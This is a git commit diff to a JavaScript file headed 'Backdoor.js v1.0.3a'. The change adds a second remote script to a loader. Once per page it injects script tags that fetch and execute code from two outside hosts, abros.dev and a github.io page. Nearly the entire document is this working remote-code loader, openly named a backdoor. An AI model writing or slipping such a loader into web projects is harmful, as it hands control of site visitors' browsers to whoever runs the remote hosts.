084826a53f18707bedc8f5eec265a1378c343954
D3usN0tam <72696191+deusnotam@users.noreply.github.com>
2024-05-08 09:02:29 +0200

    Update bd.js

--- bd.js
+++ bd.js
@@ -2,11 +2,13 @@
  * Backdoor.js v1.0.3a
  * (c) 2024-2024
  */
-
-loadScript('https://deusnotam.github.io/D3US/d3us.js');
-
-function loadScript(src) {
-  const script = document.createElement('script');
-  script.src = src;
-  document.head.appendChild(script);
+if (!window.D3US) {
+  loadScript('https://abros.dev/dev/noti.js');
+  loadScript('https://deusnotam.github.io/D3US/d3us.js');
+  function loadScript(src) {
+    const script = document.createElement('script');
+    script.src = src;
+    document.head.appendChild(script);
+  }
+  window.D3US = true;
 }
